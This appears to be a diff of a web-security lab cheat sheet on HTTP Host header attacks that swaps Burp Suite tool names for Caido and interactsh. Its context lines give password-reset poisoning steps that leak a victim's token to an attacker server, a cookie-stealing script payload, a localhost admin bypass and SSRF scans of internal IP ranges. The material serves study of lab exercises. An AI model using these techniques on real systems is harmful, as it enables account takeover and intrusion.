@@ -45,7 +45,7 @@ Applications that generate password reset links using the `Host` header value ar
 
 **Basic flow:**
 
-1. Intercept the POST request to the forgot-password endpoint in Burp Suite.
+1. Intercept the POST request to the forgot-password endpoint in Caido.
 2. Change the `Host` header to your exploit/collaborator server domain.
 3. Submit the request — the application emails the victim a link pointing to your server.
 4. Monitor your server's access log for an incoming GET request containing the reset token.
@@ -70,7 +70,7 @@ Some applications restrict admin panels or sensitive endpoints to "local" users 
 **Flow:**
 
 1. Navigate to an admin or restricted endpoint (e.g., `/admin`).
-2. Intercept the request in Burp.
+2. Intercept the request in Caido.
 3. Change `Host: target.com` to `Host: localhost`.
 4. Forward — the application may grant admin access.
 
@@ -99,9 +99,9 @@ Host: test.net"></script><script>alert(document.cookie)</script>
 
 Reverse proxies and load balancers often route traffic to back-end services based on the `Host` header. If there is no validation, an attacker can set the `Host` header to an internal IP or hostname, causing the intermediary to forward the request to internal-only services.
 
-**Detection with Burp Collaborator:**
+**Detection with interactsh/OAST:**
 
-1. Set `Host` to your Burp Collaborator subdomain.
+1. Set `Host` to your interactsh/OAST subdomain.
 2. Send the request.
 3. If the collaborator receives a DNS lookup or HTTP request, routing-based SSRF is confirmed.
 
@@ -112,7 +112,7 @@ GET / HTTP/1.1
 Host: 192.168.0.§1§
 ```
 
-Use Burp Intruder with a Numbers payload (0–255) against the last octet to scan the `192.168.0.0/24` range. A response with a different status code (e.g., 302 redirect) indicates a live internal host.
+Use Caido Automate with a Numbers payload (0–255) against the last octet to scan the `192.168.0.0/24` range. A response with a different status code (e.g., 302 redirect) indicates a live internal host.
 
 **Common private IP ranges to scan:**
 
@@ -153,7 +153,7 @@ Host: 192.168.0.137
 
 Some front-end servers validate the `Host` header only on the first request of a connection, then assume subsequent requests on the same persistent connection are trusted. By sending a legitimate first request followed by a malicious second request on the same connection, the attacker bypasses host validation.
 
-**Setup in Burp Repeater:**
+**Setup in Caido Replay:**
 
 1. Tab 1 — Legitimate request:
 ```http
@@ -169,7 +169,7 @@ Host: 192.168.0.1
 Connection: keep-alive
 ```
 
-3. Group both tabs in Burp Repeater.
+3. Group both tabs in Caido Replay.
 4. Set send mode to **"Send group in sequence (single connection)"**.
 5. Send — the second request bypasses host validation and accesses the admin panel.
 
@@ -226,7 +226,7 @@ Host: test.net"></script><script>alert(document.cookie)</script>
 Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?
 ```
 
-### Routing-Based SSRF Internal Scan (Burp Intruder)
+### Routing-Based SSRF Internal Scan (Caido Automate)
 
 ```http
 GET / HTTP/1.1
@@ -307,7 +307,7 @@ Host: vulnerable.com:evil-injected-value
 
 1. Log in as `wiener:peter` and trigger a password reset for wiener to observe normal behaviour.
 2. Confirm the reset email contains a link with a token parameter.
-3. Intercept the forgot-password POST request in Burp and send to Repeater.
+3. Intercept the forgot-password POST request in Caido and send to Replay.
 4. Change the `Host` header to your exploit server domain.
 5. Change the `username` parameter to `carlos`.
 6. Send the request — the application emails carlos a reset link pointing to your server.
@@ -322,7 +322,7 @@ Host: vulnerable.com:evil-injected-value
 **Steps:**
 
 1. Browse to `/admin` — observe "only local users can access this".
-2. Intercept the request in Burp Repeater.
+2. Intercept the request in Caido Replay.
 3. Change `Host` to `localhost`.
 4. Forward the request — admin panel is now accessible.
 5. Send a DELETE request (or use the admin form) to delete carlos and solve the lab.
@@ -335,7 +335,7 @@ Host: vulnerable.com:evil-injected-value
 
 **Steps:**
 
-1. Send a GET `/` request to Burp Repeater.
+1. Send a GET `/` request to Caido Replay.
 2. Add a duplicate `Host` header with an arbitrary value; observe it is reflected in the response.
 3. Monitor `X-Cache`, `Age`, and `Cache-Control` headers to understand cache behaviour.
 4. Inject an XSS payload in the duplicate `Host` header:
@@ -352,8 +352,8 @@ Host: test.net"></script><script>alert(document.cookie)</script>
 **Steps:**
 
 1. Send a GET `/` request and confirm normal behaviour.
-2. Set `Host` to your Burp Collaborator subdomain; confirm the server makes a DNS/HTTP request to it.
-3. Use Burp Intruder to brute-force the last octet of `192.168.0.0/24`:
+2. Set `Host` to your interactsh/OAST subdomain; confirm the server makes a DNS/HTTP request to it.
+3. Use Caido Automate to brute-force the last octet of `192.168.0.0/24`:
 ```http
 Host: 192.168.0.§1§
 ```
@@ -374,8 +374,8 @@ Host: 192.168.0.§1§
 GET https://YOUR-LAB-ID.web-security-academy.net/ HTTP/1.1
 Host: YOUR-LAB-ID.web-security-academy.net
 ```
-3. Set the `Host` header to your Burp Collaborator subdomain and confirm SSRF via incoming collaborator interaction.
-4. Use Burp Intruder to scan `192.168.0.0/24` with the absolute URL:
+3. Set the `Host` header to your interactsh/OAST subdomain and confirm SSRF via incoming collaborator interaction.
+4. Use Caido Automate to scan `192.168.0.0/24` with the absolute URL:
 ```http
 GET https://YOUR-LAB-ID.web-security-academy.net/ HTTP/1.1
 Host: 192.168.0.§1§
@@ -397,10 +397,10 @@ Host: 192.168.0.<INTERNAL_OCTET>
 
 1. Confirm direct `Host` modification is rejected (redirects back to the lab domain).
 2. Confirm duplicate headers and indented headers are also rejected.
-3. Create two Burp Repeater tabs:
+3. Create two Caido Replay tabs:
    - **Tab 1:** `GET /` with the legitimate `Host` header and `Connection: keep-alive`.
    - **Tab 2:** `GET /admin` with `Host: 192.168.0.1` and `Connection: keep-alive`.
-4. Group both tabs in Burp Repeater.
+4. Group both tabs in Caido Replay.
 5. Set send mode to **"Send group in sequence (single connection)"**.
 6. Send — Tab 2 bypasses host validation and returns the admin panel.
 7. From the admin panel response, extract the CSRF token.
